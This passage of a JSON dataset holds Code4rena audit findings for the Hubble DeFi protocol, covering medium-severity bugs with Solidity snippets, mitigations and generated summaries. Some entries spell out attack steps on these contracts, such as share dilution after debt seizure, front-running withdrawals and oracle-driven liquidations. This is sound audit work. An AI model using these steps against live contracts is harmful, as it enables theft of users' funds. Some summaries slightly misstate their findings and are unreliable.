      "title": "[M-13] Assets sent from MarginAccount to InsuranceFund will be locked forever",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/MarginAccount.sol#L377\n\n\n## Vulnerability details\n\n## Impact\nAssets sent from MarginAccount to InsuranceFund will be locked forever\n\n## Proof of Concept\nThe insurance fund doesn't have a way to transfer non-vusd out of the contract.\n\nAssets transferred to the InsuranceFund will be locked forever.\n\n## Mitigation\nHave a way for governance to sweep tokens to swap them.",
      "summary": "\nThis bug report is about a vulnerability in the MarginAccount.sol contract on the 2022-02-hubble GitHub repository. This vulnerability would allow assets sent from the MarginAccount to the InsuranceFund to be locked forever. The bug is caused by the fact that the InsuranceFund does not have a way to transfer non-vusd out of the contract. The impact of this vulnerability is that any assets transferred to the InsuranceFund will be locked forever. The bug can be mitigated by having a way for governance to sweep tokens to swap them.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/128",
      "tags": [],
      "finders": [
        "WatchPug",
        "hyh",
        "0xliumin",
        "minhquanym"
      ]
    },
    {
      "id": "1529",
      "title": "[M-12] AMM Cannot Be initialize() Except By Governance",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L93-L108\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L730-L734\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L10-L13\n\n\n## Vulnerability details\n\n## Impact\n\nThe contact `AMM.sol` cannot be initialize unless it is called from the `_governance` address.\n\nThis prevents the use of a deployer account and requires the governance to be able to deploy proxy contracts and encode the required arguements. If this is not feasible then the contract cannot be deployed.\n\n## Proof of Concept\n\n`initialize()` calls `_setGovernace(_governance);` which will store the governance address. \n\nFollowing this it will call `syncDeps(_registry);` which has `onlyGovernance` modifier.  Thus, if the `msg.sender` of `initialize()` is not the same as the parameter `_governance` then the initialisation will revert.\n\n\n```solidity\n    function initialize(\n        address _registry,\n        address _underlyingAsset,\n        string memory _name,\n        address _vamm,\n        address _governance\n    ) external initializer {\n        _setGovernace(_governance);\n\n        vamm = IVAMM(_vamm);\n        underlyingAsset = _underlyingAsset;\n        name = _name;\n        fundingBufferPeriod = 15 minutes;\n\n        syncDeps(_registry);\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider adding the steps manually to `initialize()`. i.e.\n\n```solidity\n    function initialize(\n        address _registry,\n        address _underlyingAsset,\n        string memory _name,\n        address _vamm,\n        address _governance\n    ) external initializer {\n        _setGovernace(_governance);\n\n        vamm = IVAMM(_vamm);\n        underlyingAsset = _underlyingAsset;\n        name = _name;\n        fundingBufferPeriod = 15 minutes;\n\n        IRegistry registry = IRegistry(_registry);\n        clearingHouse = registry.clearingHouse();\n        oracle = IOracle(registry.oracle());\n}\n```",
      "summary": "\nThis bug report is about the contract AMM.sol, which is part of the code-423n4/2022-02-hubble repository. The issue is that the contract cannot be initialized unless it is called from the _governance address. This prevents the use of a deployer account and requires the governance to be able to deploy proxy contracts and encode the required arguements. If this is not feasible then the contract cannot be deployed.\n\nThe proof of concept is that the initialize() function calls _setGovernace(_governance) and syncDeps(_registry) which has the onlyGovernance modifier. This means that if the msg.sender of initialize() is not the same as the parameter _governance then the initialisation will revert.\n\nThe recommended mitigation steps are to consider adding the steps manually to the initialize() function. This would involve adding IRegistry registry = IRegistry(_registry); clearingHouse = registry.clearingHouse(); oracle = IOracle(registry.oracle());. This would allow the contract to be initialized without the need for the _governance address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/51",
      "tags": [],
      "finders": [
        "kirk-baird"
      ]
    },
    {
      "id": "1528",
      "title": "[M-11] Users are able to front-run bad debt settlements to avoid insurance costs",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird, also found by itsmeSTYJ_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/InsuranceFund.sol#L71-L75><br>\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/InsuranceFund.sol#L62-L69>\n\nA user is able to front-run the call to `seizeBadDebt()` in `InsuranceFund.sol` to avoid paying the insurance costs.\n\n`seizeBadDebt()` is called by `MarginAccount.settleBadDebt()` which is a public function. When this functions is called the transaction will appear in the mem pool.  A user may then call `InsuranceFund.withdraw()` to withdraw all of their shares. If they do this with a higher gas fee it will likely be processed before the `settleBadDebt()` transaction. In this way they will avoid incurring any cost from the assets being seized.\n\nThe impact is that users may gain their share of the insurance funding payments with minimal risk (minimal as there is a change the front-run will not succeed) of having to repay these costs.\n\n### Proof of Concept\n\n        function withdraw(uint _shares) external {\n            settlePendingObligation();\n            require(pendingObligation == 0, \"IF.withdraw.pending_obligations\");\n            uint amount = balance() * _shares / totalSupply();\n            _burn(msg.sender, _shares);\n            vusd.safeTransfer(msg.sender, amount);\n            emit FundsWithdrawn(msg.sender, amount, block.timestamp);\n        }\n\n<!---->\n\n        function seizeBadDebt(uint amount) external onlyMarginAccount {\n            pendingObligation += amount;\n            emit BadDebtAccumulated(amount, block.timestamp);\n            settlePendingObligation();\n        }\n\n### Recommended Mitigation Steps\n\nConsider making the withdrawals a two step process. The first step requests a withdrawal and marks the time. The second request processes the withdrawal but requires a period of time to elapse since the first step.\n\nTo avoid having users constantly having pending withdrawal, each withdrawal should have an expiry time and also a recharge time. The if the second step is not called within expiry amount of time it should be considered invalid. The first step must not be able to be called until recharge time has passed.\n\nAnother solution involves a design change where the insurance fund is slowly filled up over time without external deposits. However, this has the disadvantage that bad debts received early in the protocols life time may not have sufficient insurance capital to cover them.\n\n**[atvanguard (Hubble) confirmed](https://github.com/code-423n4/2022-02-hubble-findings/issues/59)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report outlines a vulnerability in the InsuranceFund.sol contract in the 2022-02-hubble repository. It allows a user to front-run the call to the seizeBadDebt() function and thus avoid paying the insurance costs. This is done by calling the withdraw() function with a higher gas fee before the settleBadDebt() transaction is processed. The impact of this is that users may gain their share of the insurance funding payments with minimal risk of having to repay these costs.\n\nRecommended mitigation steps include making the withdrawals a two step process, where the first step requests a withdrawal and marks the time, and the second request processes the withdrawal but requires a period of time to elapse since the first step. This should also have an expiry time and a recharge time, so that if the second step is not called within expiry amount of time it should be considered invalid. Another solution involves a design change where the insurance fund is slowly filled up over time without external deposits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/59",
      "tags": [],
      "finders": [
        "itsmeSTYJ",
        "kirk-baird"
      ]
    },
    {
      "id": "1527",
      "title": "[M-10] Blocking of the VUSD withdrawals is possible if the reserve token doesnt support zero value transfers",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L62\n\n\n## Vulnerability details\n\n## Impact\n\nVUSD withdraw queue will be blocked and user funds frozen simply by requesting a zero value withdraw, if the reserve token doesn't support zero value transfers.\n\nPutting it medium only on an assumption that reserve will be USDC and the probability is low, but VUSD do allow any reserve token and the impact here is both funds freeze and stopping of the operations\n\n## Proof of Concept\n\nIt is possible to burn zero amount in OZ implementation:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC20/ERC20Upgradeable.sol#L285-L300\n\nSo, withdraw will burn zero amount and put it to the queue:\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L48\n\nUSDC does support zero value transfers, but not all the tokens do:\n\nhttps://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\n\nCurrently VUSD can use any reserve token:\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L33\n\nWithdraw queue position can be modified in the `processWithdrawals` function only.\n\nBut it will fail every time on the zero amount entry, as there is no way to skip it (and mint VUSD back, for example), so anything else after this zero entry will not be processed:\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L62\n\nThis way the withdrawal functionality and the corresponding user funds will be frozen within VUSD contract, which will become inoperable\n\n## Recommended Mitigation Steps\n\nConsider adding a zero amount check, as it doesnt cost much, while zero transfer doesn't make sense anyway.\n\nNow:\n```\nreserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);\nreserve -= withdrawal.amount;\n```\n\nTo be:\n```\nif (withdrawal.amount > 0) {\n\treserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);\n\treserve -= withdrawal.amount;\n}\n```",
      "summary": "\nA bug report has been submitted which discusses the possibility of a zero value withdraw blocking the VUSD withdraw queue and freezing user funds. The bug is present when the reserve token does not support zero value transfers. The proof of concept includes a link to an OZ implementation which allows for the burning of zero amount, as well as links to code which shows the withdraw queue position can only be modified in the processWithdrawals function. The recommended mitigation step is to add a zero amount check as it does not cost much and does not make sense anyway.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/29",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1526",
      "title": "[M-09] Ownership of Swap.vy cannot be transferred",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/curve-v2/Swap.vy#L1129\n\n\n## Vulnerability details\n\n## Impact\nOwnership transfer function of Swap.vy is commented out. Fund can be stuck if an AMM and governance change/upgrade is required.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/curve-v2/Swap.vy#L1129",
      "summary": "\nA bug has been reported in the code-423n4/2022-02-hubble repository. The ownership transfer function of Swap.vy is commented out and this could cause funds to be stuck if an AMM and governance change/upgrade is required. This bug can be found at the link provided in the report. \n\nThe impact of this bug is that if a governance change or upgrade is required, the funds may become stuck and unable to be accessed. This could lead to financial losses for the user. \n\nThe proof of concept for this bug can be found at the link provided in the report. It is important to note that this bug should be fixed as soon as possible to avoid any potential financial losses.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/93",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1525",
      "title": "[M-08] All AMMs have to be past nextFundingTime to update",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xliumin_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/AMM.sol#L348><br>\n\nsettleFunding calls will revert until all AMMs are ready to be updated.\n\n### Proof of Concept\n\nAMM 1 has a nextFundingTime of now. AMM 2 has a nextFundingTime in 30 minutes. AMM 1 won't be able to be updated until after AMM 2's nextFundingTime elapses.\n\n### Recommended Mitigation Steps\n\nYou shouldn't revert at the place mentioned in the links to affected code. Just return so that the other AMMs can still get updated.\n\n**[atvanguard (Hubble) confirmed and resolved](https://github.com/code-423n4/2022-02-hubble-findings/issues/130)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the settleFunding calls in the AMM.sol contract. The calls are reverting until all AMMs are ready to be updated. This is demonstrated in the proof of concept where AMM 1 has a nextFundingTime of now, while AMM 2 has a nextFundingTime in 30 minutes. This means that AMM 1 will not be able to be updated until after AMM 2's nextFundingTime elapses. The proposed mitigation for this bug is to not revert at the place mentioned in the links to the affected code, but instead just return so that the other AMMs can still get updated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/130",
      "tags": [],
      "finders": [
        "0xliumin"
      ]
    },
    {
      "id": "1524",
      "title": "[M-07] ClearingHouse margin calculations will break up if an AMM returning non-6 decimals positions be white listed",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L332><br>\n\nIt is assumed that VAMM returned positions have exactly `6` decimals for all AMMs white listed in ClearingHouse.\n\nIn the same time an array of different AMMs/VAMMs is supported, and there are no guarantees/checks of the precision of the position values they return.\n\nIf an VAMM that have different precision is whitelisted, for example having 18 decimals for position figures, then margin requirements checks become invalid.\n\nThis will lead to various malfunctions, say perfectly valid positions will be liquidated by any attacker noticing that the calculations are skewed.\n\n### Proof of Concept\n\nClearingHouse's \\_calcMarginFraction is the function that is used for margin requirements checks:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L163-L167>\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L188-L189>\n\n\\_calcMarginFraction calls getNotionalPositionAndMargin:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L319-L320>\n\ngetNotionalPositionAndMargin calls getTotalNotionalPositionAndUnrealizedPnl:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L291>\n\ngetTotalNotionalPositionAndUnrealizedPnl sums up AMM's getNotionalPositionAndUnrealizedPnl results:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L269-L282>\n\nAMM's getNotionalPositionAndUnrealizedPnl returns vamm.get_notional result:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L395-L410>\n\nThe above calls are linear decimals wise (i.e. do subtractions/additions kind of operations, preserving the decimals).\n\nThen, \\_getMarginFraction mixes up these notionalPosition and margin, obtained from AMM without rescaling, as if they are PRECISION scaled:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L332>\n\nPRECISION is hard coded to be `1e6`:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L15>\n\nFor other VAMM operations base precision is set to `1e18`:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L17>\n\nFor example, VAMM returned supply is assumed to have 18 decimals:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L523>\n\nComment says that exchangeExactOut returned quantity will have 6 decimals precision:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L495>\n\nAs the system imply that VAMMs can vary it is neither guaranteed, nor checked in any way (briefly checked dydx api code, it looks like there are no explicit guarantees either).\n\nIf any of VAMM referenced via white listed AMMs return VAMM.get_notional with decimals different from `6`, the \\_calcMarginFraction result will become grossly incorrect.\n\n### Recommended Mitigation Steps\n\nIf AMM contract is desired to deal with various VAMMs, consider removing decimals related hard coding, adding decimals variables and scaling VAMM returned results accordingly, so that position and margin values' decimals of 6, implied by ClearingHouse logic, be ensured.\n\n**[atvanguard (Hubble) disputed and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/37#issuecomment-1049514297):**\n > Protocols developers will ensure that correct decimals are used everywhere. It's not possible to assert this in code at all places.\n\n**[JasoonS (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/37#issuecomment-1059993161):**\n > Set to medium as unlikely that this would be done. However, checks and notices in the documentation of this code would be very important to prevent new devs from making these mistakes.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the ClearingHouse contract, which is used to check margin requirements for AMMs (automated market makers) that are whitelisted in the contract. The bug is that if an AMM with a different precision is whitelisted, then the margin requirements checks become invalid. This can lead to malfunctions and valid positions being liquidated by an attacker.\n\nThe proof of concept is that the _calcMarginFraction function calls getNotionalPositionAndMargin, which calls getTotalNotionalPositionAndUnrealizedPnl, which sums up AMM's getNotionalPositionAndUnrealizedPnl results. These calls are linear decimals wise, but then _getMarginFraction mixes up these notionalPosition and margin values without rescaling, as if they are PRECISION scaled. The PRECISION is hard coded to be 1e6, while for other VAMM operations it is set to 1e18.\n\nThe recommended mitigation steps are to remove decimals related hard coding, add decimals variables and scale VAMM returned results accordingly, so that the position and margin values' decimals of 6 implied by the ClearingHouse logic is ensured.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/37",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1523",
      "title": "[M-06] After debt seizure from InsuranceFund, user can dilute all past participants.",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\n https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L56\n\n\n## Vulnerability details\n\n\n\n## Impact\nA user can get a much larger portion of the pool as it recovers from a debt seizure. The intent of the insurance pool seems to be that it could recover from a bad debt event.\n\n## Proof of Concept\n1. Alice is the first LP to the insurance pool, and deposits 1e18 shares.\n2. `seizeBadDebt` is called with 2e18. Now, there are `pendingObligations = 1e18`, and there is 0 vusd in the insurance fund. \n3. Bob (the attacker) directly transfers 1e18 + 1 vUSD.\n4. Bob calls deposit with 1e18 vUSD. All pending obligations will be settled, but there will only be 1 vUSD left in the pool before Bob's deposit. Bob receives `shares = 1e18 * 1e18 / 1`. As a result, Bob will get `1e36` shares, diluting Alice's share of the pool. Bob will be able to take a much larger share of all future profits from the insurance fund until more bad debt is seized. Bob only provided 2e18 + 1 liqudiity, but received an exponentially larger number of shares than Alice.\n\n\n## Mitigation\nit depends on how you want this to work. You could keep track of the total amount ever contributed by users, and use that for calculations. Or just make staking 1 vUSD = 1 share if the pool total is below the total number of shares.",
      "summary": "\nThis bug report is about a vulnerability in the code of an insurance fund contract. The vulnerability allows a user, Bob, to get a much larger portion of the pool than intended when it recovers from a debt seizure. This is done by Bob directly transferring 1e18 + 1 vUSD and then calling deposit with 1e18 vUSD. This results in Bob receiving 1e36 shares, diluting Alice's share of the pool. The mitigation for this vulnerability is to keep track of the total amount ever contributed by users, or to make staking 1 vUSD = 1 share if the pool total is below the total number of shares.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/129",
      "tags": [],
      "finders": [
        "0xliumin"
      ]
    },
    {
      "id": "1522",
      "title": "[M-05] Oracle.getUnderlyingPrice could have wrong decimals",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/Oracle.sol#L34\n\n\n## Vulnerability details\n\n## Impact\nThe `Oracle.getUnderlyingPrice` function divides the chainlink price by `100`.\nIt probably assumes that the answer for the underlying is in 8 decimals but then wants to reduce it for 6 decimals to match USDC.\n\nHowever, arbitrary `underlying` tokens are used and the chainlink oracles can have different decimals.\n\n## Recommended Mitigation Steps\nWhile most USD price feeds use 8 decimals, it's better to take the on-chain reported decimals into account by doing `AggregatorV3Interface(chainLinkAggregatorMap[underlying]).decimals()`, see [Chainlink docs](https://docs.chain.link/docs/get-the-latest-price/#getting-a-different-price-denomination).\nThe price should then be scaled down to 6 decimals.",
      "summary": "\nThis bug report is about the `Oracle.getUnderlyingPrice` function in the code located at https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/Oracle.sol#L34. The function divides the chainlink price by 100 and assumes the answer for the underlying is in 8 decimals, but wants to reduce it for 6 decimals to match USDC. However, arbitrary underlying tokens are used and the chainlink oracles can have different decimals. This could lead to incorrect calculations. The recommended mitigation step is to take the on-chain reported decimals into account by using the `AggregatorV3Interface(chainLinkAggregatorMap[underlying]).decimals()` function from the Chainlink docs, and then scale down the price to 6 decimals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/44",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1521",
      "title": "[M-04] settleFunding will exceed block gas with more markets and activity",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L129\nhttps://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L678\n\n\n## Vulnerability details\n\n## Impact\n\nAs the number of supported markets grow, `settleFunding` will reach a point were it exceeds the block gas limit on Avalanche C-Chain. This will prevent users from calling the function and cause a wide spread Denial of Service.\n\nLooking at transactions for the current testnet deployment, `settleFunding` already reaches almost 10% of the block gas limit. This is due settle funding iteratively looping through each market, with each iteration entering an unbounded `while` loop in `_calcTwap`. The more active the markets are, the more gas intensive `_calcTwap` becomes, as more snapshots need to be traversed. \n\nThe combination of more active markets and an increase in available markets make it very likely that some users will be unable to call `settleFunding` in the long run.\n\n\n## Proof of Concept\n\nExample of transactions on testnet:\n\n| Gas | Limit% | Link |\n|-----|--------|-----|\n| 658428 | 8.2% | https://testnet.snowtrace.io/tx/0x8123a5658a98e694e7428e66c9e5f9d5cbff8af93d543ed51a80cb367bcccd2c |\n| 653810 | 8.1% | https://testnet.snowtrace.io/tx/0xf126eb05245580a73981228d6f0f8d607ad038ca0b68593f0c903e210c1c2c57 | \n\n## Recommended Mitigation Steps\n\nUsers should be allowed to settle funding per market or using an array of markets opposed to all markets at once.\n\n```solidity\nfunction settleFundingForMarkets(IAMM[] markets) override external whenNotPaused {\n     for (uint i = 0; i < markets.length; i++) {\n          markets[i].settleFunding();\n     }\n}\n```\n\nIn this way the gas cost will not increase with the number of markets created over time.",
      "summary": "\nThis bug report is about the `settleFunding` function in the ClearingHouse and AMM contracts on the Avalanche C-Chain. The function is used to settle funding for markets and as the number of supported markets grow, it will exceed the block gas limit, causing a Denial of Service. This is already occurring on the testnet, with the function reaching almost 10% of the block gas limit. The recommended mitigation step is to allow users to settle funding per market or using an array of markets opposed to all markets at once. This will prevent the gas cost from increasing with the number of markets created.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/97",
      "tags": [],
      "finders": [
        "cmichel",
        "Dravee",
        "Ruhum",
        "gzeon",
        "Omik",
        "bw"
      ]
    },
    {
      "id": "1520",
      "title": "[M-03] ClearingHouse May Whitelist Duplicate AMMs",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L339-L342><br>\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L269-L282>\n\n`ClearingHouse.sol` allows the Governance protocol to whitelist `AMM.sol` contracts. These contracts allow users to earn profits based on the price of a base asset against a quote asset.\n\nIt is possible to add the same `AMM` twice in the function `whitelistAmm()`. The impact is that unrealized profits will be counted multiple times. As a result the liquidation calculations will be incorrect, potentially allowing users to trade while insolvent or incorrectly liquidating solvent users.\n\nNote `whitelistAmm()` may only be called by Governance.\n\n### Proof of Concept\n\nThe function `getTotalNotionalPositionAndUnrealizedPnl()` will iterate over all `amms` summing the `unrealizedPnl`  and `notinoalPosition`, thus if an `amm` is repeated the `unrealizedPnl` and `notionalPosition` of that asset will be counted multiple times.\n\nThis is used in `_calcMarginFraction()` which calculates a users margin as a fraction of the total position. The margin fraction is used to determine if a user is liquitable or is allowed to open new positions.\n\n### Recommended Mitigation Steps\n\nConsider ensuring the `AMM` does not already exist in the list when adding a new `AMM`.\n\n        function whitelistAmm(address _amm) external onlyGovernance {\n            for (uint256 i; i < amm.length; i++) {\n                require(amm[i] != IAMM(_amm), \"AMM already whitelisted\");\n            }\n            emit MarketAdded(amms.length, _amm);\n            amms.push(IAMM(_amm));\n        }\n\n**[atvanguard (Hubble) confirmed, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/50#issuecomment-1049571812):**\n > As mentioned in [#40](https://github.com/code-423n4/2022-02-hubble-findings/issues/40), the system relies on the admin to do the right thing; hence disagreeing with the severity. Still, it's a good idea to have this check.\n\n**[atvanguard (Hubble) resolved](https://github.com/code-423n4/2022-02-hubble-findings/issues/50)**\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/50#issuecomment-1059926048):**\n > Practical advice that prevents a catastrophic issue that could very possibly occur (having run deployment / whitelist and many other scripts, it's way too easy to run something again etc and end up in this situation - even though it feels like it would never be possible). \n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the ClearingHouse.sol contract, which allows Governance to whitelist AMM.sol contracts. These contracts allow users to earn profits based on the price of a base asset against a quote asset. It is possible to add the same AMM twice in the function whitelistAmm(), which will cause unrealized profits to be counted multiple times and lead to incorrect liquidation calculations. This can potentially allow users to trade while insolvent or incorrectly liquidate solvent users.\n\nThe bug is demonstrated by the function getTotalNotionalPositionAndUnrealizedPnl(), which iterates over all amms summing the unrealizedPnl and notionalPosition, thus if an amm is repeated the unrealizedPnl and notionalPosition of that asset will be counted multiple times. This is used in _calcMarginFraction(), which calculates a users margin as a fraction of the total position. The margin fraction is used to determine if a user is liquitable or is allowed to open new positions.\n\nThe recommended mitigation step is to ensure the AMM does not already exist in the list when adding a new AMM. This can be done by adding a require statement in the whitelistAmm() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/50",
      "tags": [],
      "finders": [
        "kirk-baird"
      ]
    },
    {
      "id": "1519",
      "title": "[M-02] Hidden governance",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x1f8b_\n\nThe contract use two governance model, one looks hidden.\n\n### Proof of Concept\n\nThe [VUSD contract](https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/VUSD.sol#L11) uses `VanillaGovernable` but inherits from `ERC20PresetMinterPauserUpgradeable` and this contract uses roles to use some administrative methods like `pause` or `mint`.\n\nThis two-governance model does not seem necessary and can hide or raise suspicion about a rogue pool, thus damaging the user's trust.\n\n### Recommended Mitigation Steps\n\nUnify governance in only one, VanillaGovernable or role based.\n\n**[atvanguard (Hubble) confirmed and resolved](https://github.com/code-423n4/2022-02-hubble-findings/issues/11)**\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/11#issuecomment-1059926864):**\n > Yes, a good suggestion to keep governance more tightly coupled. OZ has AccessControlledAndUpgradeable which is really nice. Various roles for varying level of admin functionality. Allows tighter controls on more controversial items and easier control on less controversial items. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the VUSD contract. It is found that the contract uses two governance models, one of which is hidden. This can lead to suspicion about a rogue pool and damage user trust. The vulnerability can be mitigated by unifying governance in one model, either VanillaGovernable or role based.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/11",
      "tags": [],
      "finders": [
        "0x1f8b"
      ]
    },
    {
      "id": "1518",
      "title": "[M-01] Liquidations can be run on the bogus Oracle prices",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by 0x1f8b, cccz, csanuragjain, defsec, hubble, leastwood, pauliax, WatchPug, and ye0lde_\n\nIf the price feed is manipulated in any way or there is any malfunction based volatility on the market, a malicious user can use this to liquidate a healthy position.\n\nAn attacker can setup a monitoring of the used Oracle feed and act on observing a price outbreak (for example, zero price, which is usually a subject to filtration), liquidating the trader position which is perfectly healthy otherwise, obtaining the collateral with a substantial discount at the expense of the trader.\n\nThe same is for a flash crash kind of scenario, i.e. a price outbreak of any nature will allow for non-market liquidation by an attacker, who has the incentives to setup such a monitoring and act on such an outbreak, knowing that it will not be smoothed or filtered out, allowing a liquidation at a non-market price that happen to be printed in the Oracle feed\n\n### Proof of Concept\n\nOracle.getUnderlyingPrice just passes on the latest Oracle answer, not checking it anyhow:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/Oracle.sol#L24-L35>\n\nIt is then used in liquidation triggers providing isLiquidatable and \\_getLiquidationInfo functions:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/MarginAccount.sol#L249>\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/MarginAccount.sol#L465>\n\n### Recommended Mitigation Steps\n\nAdd a 